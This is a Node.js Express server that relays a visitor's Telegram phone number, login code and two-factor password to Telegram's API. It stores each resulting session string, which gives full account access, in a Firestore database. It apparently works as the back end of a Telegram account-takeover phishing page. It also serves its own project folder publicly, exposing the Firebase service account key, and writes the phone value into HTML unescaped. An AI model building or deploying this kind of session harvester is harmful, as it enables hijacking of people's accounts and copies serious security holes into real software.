require('dotenv').config();
const express = require('express');
const path = require('path');
const crypto = require('crypto');

const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { Api } = require('telegram');

const admin = require('firebase-admin');
const serviceAccount = require('./serviceAccountKey.json');

admin.initializeApp({
  credential: admin.credential.cert(serviceAccount),
});

const db = admin.firestore();

const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('.'));

// ================= CONFIG =================
const apiId = parseInt(process.env.API_ID);
const apiHash = process.env.API_HASH;

// temp session store
const tempSessions = {};

// ================= OPTIONAL ENCRYPT =================
const SECRET = process.env.SECRET_KEY || "my_secret";

function encrypt(text) {
  return crypto.createHash('sha256').update(text + SECRET).digest('hex');
}

// ================= UI =================
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/favicon.ico', (req, res) => res.status(204));

// ================= STEP 1: SEND OTP =================
app.post('/send-otp', async (req, res) => {
  let { phone } = req.body;

  try {
    phone = String(phone).trim();
    if (!phone.startsWith('+')) phone = '+855' + phone;

    const client = new TelegramClient(
      new StringSession(''),
      apiId,
      apiHash,
      { connectionRetries: 5 }
    );

    await client.connect();

    const result = await client.invoke(
      new Api.auth.SendCode({
        phoneNumber: phone,
        apiId,
        apiHash,
        settings: new Api.CodeSettings({})
      })
    );

    tempSessions[phone] = {
      client,
      phoneCodeHash: result.phoneCodeHash
    };

    return res.json({ success: true });

  } catch (err) {
    console.error("SEND OTP ERROR:", err);
    return res.json({ success: false, error: err.message });
  }
});

// ================= STEP 2: VERIFY OTP =================
app.post('/login', async (req, res) => {
  let { phone, otp } = req.body;

  try {
    phone = String(phone).trim();
    if (!phone.startsWith('+')) phone = '+855' + phone;

    const temp = tempSessions[phone];
    if (!temp) return res.send("Session expired");

    const { client, phoneCodeHash } = temp;

    let needPassword = false;

    try {
      await client.signIn({
        phoneNumber: phone,
        phoneCode: String(otp),
        phoneCodeHash
      });

    } catch (err) {
      if (err.errorMessage === "SESSION_PASSWORD_NEEDED") {
        needPassword = true;
      } else {
        throw err;
      }
    }

    // ================= 2FA REQUIRED =================
    if (needPassword) {
      return res.send(`
        <h3>🔐 Enter 2FA Password</h3>
        <form method="POST" action="/login-password">
          <input type="hidden" name="phone" value="${phone}" />
          <input type="password" name="password" required />
          <button type="submit">Continue</button>
        </form>
      `);
    }

    // ================= SAVE SESSION (NO 2FA) =================
    const sessionString = client.session.save();

    await db.collection('telegram_sessions').doc(phone).set({
      phone,
      sessionString,
      has2FA: "nopass",
      createdAt: admin.firestore.FieldValue.serverTimestamp()
    });

    delete tempSessions[phone];

    return res.send("<h3>✅ Login success (no 2FA)</h3>");

  } catch (err) {
    console.error(err);
    return res.send(`<h3>❌ ${err.message}</h3>`);
  }
});

// ================= STEP 3: 2FA PASSWORD =================
app.post('/login-password', async (req, res) => {
  let { phone, password } = req.body;

  try {
    phone = String(phone).trim();
    if (!phone.startsWith('+')) phone = '+855' + phone;

    const temp = tempSessions[phone];
    if (!temp) return res.send("Session expired");

    const { client } = temp;

    await client.signInWithPassword({
      password: String(password)
    });

    const sessionString = client.session.save();

    await db.collection('telegram_sessions').doc(phone).set({
      phone,
      sessionString,
      has2FA: "pass",
      passwordEncrypted: encrypt(password),
      createdAt: admin.firestore.FieldValue.serverTimestamp()
    });

    delete tempSessions[phone];

    return res.send("<h3>✅ Login success (2FA)</h3>");

  } catch (err) {
    console.error(err);
    return res.send(`<h3>❌ ${err.message}</h3>`);
  }
});

// ================= START =================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log("Server running on port", PORT);
});
